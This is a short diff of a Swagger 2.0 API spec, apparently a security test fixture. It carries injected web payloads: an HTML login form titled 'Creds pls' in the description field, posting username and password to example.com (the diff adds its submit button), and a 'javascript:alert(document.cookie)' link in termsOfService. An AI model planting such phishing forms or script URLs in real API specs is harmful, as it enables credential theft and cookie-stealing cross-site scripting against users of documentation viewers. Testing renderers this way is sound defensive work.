@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Creds pls
-  description: <h2>Please enter your credentials</h2><form action="https://example.com/login" method="post"><input type="text" name="username" size="20"><input type="password" name="password" size="20"></form>
+  description: <h2>Please enter your credentials</h2><form action="https://example.com/login" method="post"><input type="text" name="username" size="20"><input type="password" name="password" size="20"><input type="submit" name="Submit" value="Submit"></form>
   version: production
   termsOfService: 'javascript:alert(document.cookie)'
 basePath: /Test/
